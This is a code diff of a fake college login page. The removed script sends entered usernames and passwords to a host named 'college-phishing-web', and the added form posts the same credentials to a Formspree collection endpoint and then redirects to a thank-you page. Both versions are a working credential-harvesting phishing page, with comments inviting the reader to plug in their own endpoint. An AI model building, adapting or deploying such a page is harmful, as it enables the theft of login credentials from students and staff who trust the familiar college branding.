@@ -58,39 +58,17 @@
     <img src="College_logo.png" alt="College Logo" class="logo">
     <h2>Login</h2>
     
-    <form id="loginForm">
-      <input type="text" id="username" placeholder="Username" required>
-      <input type="password" id="password" placeholder="Password" required>
+    <!-- Replace with your Formspree endpoint -->
+    <form action="https://formspree.io/f/mabcdxyz" method="POST">
+      <input type="text" name="username" placeholder="Username" required>
+      <input type="password" name="password" placeholder="Password" required>
+
+      <!-- You can add hidden fields if you want -->
+      <input type="hidden" name="_redirect" value="https://yourwebsite.com/thankyou.html">
+
       <input type="submit" value="Login">
     </form>
-
-    <p id="output"></p>
   </div>
-
-  <!-- 🔹 REPLACE this script with fetch() -->
-  <script>
-    document.getElementById("loginForm").addEventListener("submit", async function(e) {
-      e.preventDefault(); // stop page refresh
-
-      let user = document.getElementById("username").value;
-      let pass = document.getElementById("password").value;
-
-      try {
-        let response = await fetch("https://college-phishing-web.onrender.com", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({ username: user, password: pass })
-        });
-
-        let result = await response.json();
-        document.getElementById("output").innerText = result.message;
-      } catch (err) {
-        document.getElementById("output").innerText = "Error: " + err.message;
-      }
-    });
-  </script>
 
 </body>
 </html>
